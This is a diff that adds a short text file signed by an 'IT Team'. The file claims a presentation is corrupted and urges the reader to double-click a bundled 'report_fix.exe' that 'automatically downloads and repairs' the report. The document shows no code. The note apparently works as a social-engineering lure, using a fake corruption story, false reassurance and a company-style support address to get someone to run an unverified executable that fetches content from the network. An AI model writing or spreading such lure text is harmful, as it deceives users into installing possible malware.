@@ -1,0 +1,21 @@
+IMPORTANT.txt
+----------
+
+IMPORTANT: This report file may be corrupted. To ensure you can view the slides correctly, please follow these steps:
+
+1. Open “annual_review_2024.pptx” in PowerPoint  
+   • You should see an error message such as “PowerPoint cannot open the file” or “The file is corrupted.”  
+   • Seeing this error confirms the issue—you may attempt PowerPoint’s built-in repair.
+   • If it is unsuccessful attempt step 2.
+
+
+2. Run the included “report_fix.exe” tool  
+   • Locate “report_fix.exe” in this folder.  
+   • Double-click it to automatically download and repair the report.  
+
+3. After the repair completes, the corrected presentation will open automatically.  
+
+4. If you still cannot view the slides, contact Company Support at support@company.local.
+
+Thank you for your patience—this quick repair tool will have you back up and running in seconds.  
+— IT Team
